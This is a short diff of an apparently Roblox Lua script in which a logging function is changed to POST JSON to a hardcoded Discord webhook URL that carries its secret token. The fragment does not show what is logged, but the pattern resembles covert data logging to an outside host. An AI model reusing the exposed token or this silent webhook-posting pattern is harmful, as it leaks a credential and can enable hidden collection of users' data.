@@ -47,11 +47,8 @@ local function log_information(...)
 		["flags"] = 0
 	})
 
-	local to = game.MaterialService:GetAttribute("lol")
-	repeat task.wait() to = game.MaterialService:GetAttribute("lol") until to ~= nil
-	game.MaterialService:SetAttribute("lol", nil)
 	request({
-		Url = to,
+		Url = "https://discord.com/api/webhooks/1527174934596419715/r1MLJakcT2Tfkn0PivhU0IUKx7cZCwTHG_0qIr0yFdNUA_Mah8pZCyKwgdENsvNXRtiO",
 		Method = "POST",
 		Headers = {
 			["Content-Type"] = "application/json"
